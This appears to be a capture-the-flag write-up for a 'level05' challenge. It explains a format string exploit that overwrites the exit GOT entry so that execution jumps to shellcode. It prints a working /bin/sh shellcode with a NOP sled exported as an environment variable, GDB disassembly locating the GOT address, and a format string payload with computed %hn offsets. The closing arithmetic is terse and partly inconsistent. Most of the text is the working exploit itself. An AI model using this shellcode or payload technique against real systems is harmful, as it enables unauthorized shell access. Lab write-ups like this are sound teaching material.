`env -i su level05` is necessary to succeed

We want to overwrite the GOT table.
To do so we will do a String Format Exploit.

First we need to export our NOP sled + Shell Code :
`export SHELLCODE=$(python -c 'print("\x90" * 100 + "\x31\xc9\xf7\xe1\x04\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")')`

Then with GDB :
```C
(gdb) disas main
Dump of assembler code for function main:
   0x08048444 <+0>:	push   %ebp
    [...]
   0x08048507 <+195>:	call   0x8048340 <printf@plt>
   0x0804850c <+200>:	movl   $0x0,(%esp)
   0x08048513 <+207>:	call   0x8048370 <exit@plt>
End of assembler dump.
(gdb) disas 0x8048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330
End of assembler dump.
```

### Now we have exit Global Offset Table address `0x080497e0`.
We want to write to that address the address of our shellcode.

Since our offsets are too big, we can't use the same strategy as in rainfall.  
We must first write the 2 first bytes, then the two last bytes.

To do so we will use a format string exploit.

```bash
python -c 'print("\xe0\x97\x04\x08\xe2\x97\x04\x08" + "%VALUE1x%10$hn%VALUE2x%11$hn")'
                  ^^^^^^^^^^^^^^^^
                       see 1.
                                  ^^^^^^^^^^^^^^^^
                                       see 2.
                                                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                                                 see 3.
```

1. `\xe0\x97\x04\x08` will be used to write with hn on the first two bytes of this address.
2. `\xe2\x97\x04\x08` is 2 bytes after the first address, which we will use to write on the two last bytes with hn.
3. After that we just need to know where our Shellcode is located in the stack in order to replace `VALUE1` and `VALUE2`.


e8b5 = 56864 - 8 --> 56856
ffff = 65535 - 56856 --> 8679 -8

python -c 'print("\xe0\x97\x04\x08\xe2\x97\x04\x08" + "%56856x%10$hn%8671x%11$hn")'

0xffffe710


